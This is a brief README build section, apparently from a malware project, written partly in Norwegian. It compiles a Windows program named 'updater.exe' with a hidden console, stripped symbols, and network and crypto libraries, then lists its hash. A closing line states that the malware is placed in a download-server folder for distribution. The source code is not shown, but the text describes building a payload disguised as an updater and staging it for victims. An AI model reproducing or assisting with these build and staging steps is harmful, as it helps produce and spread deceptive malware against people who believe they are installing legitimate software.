# Build

```bash
x86_64-w64-mingw32-gcc main.c icon.res -o updater.exe -lws2_32 -lbcrypt -lshell32 -lwininet -mwindows -s
```

```bash
sha256sum updater.exe 
```

`254601603f918d20338739b1eb4cb15bd31525aa5bcc2520c0432bb055603d7d  updater.exe`

Skadevaren legges i `nedlastingsserver/skadevare/`.
